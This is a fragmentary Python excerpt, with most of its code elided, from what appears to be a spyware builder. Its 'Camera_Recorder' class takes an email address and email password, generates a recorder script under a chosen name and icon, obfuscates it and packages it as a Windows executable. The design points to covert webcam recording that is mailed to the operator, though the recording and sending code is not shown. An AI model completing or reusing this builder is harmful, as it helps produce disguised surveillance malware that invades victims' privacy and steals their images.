...
class Camera_Recorder():
    ...
    def recorder(self, name, user_mail, user_mail_password, time_out):
        if OS == "windows":
            os.system("cls")
    ...
    def start(self):
        ...
        if answer.startswith("set.mail "):
            ...
            user_pm_name = input(f"{colors['GREEN']}[+]{colors['ZERO']} The Name Of Camera Recorder: ")
            user_pm_icon = input(f"{colors['GREEN']}[+]{colors['ZERO']} The Icon Of Camera Recorder (Optional): ")
            user_pm_name = user_pm_name + ".py"
            self.recorder(user_pm_name, self.user_name, self.user_password, self.time_out)
            self.obfuscate(user_pm_name)
            self.convert_to_exe(user_pm_name, user_pm_icon)
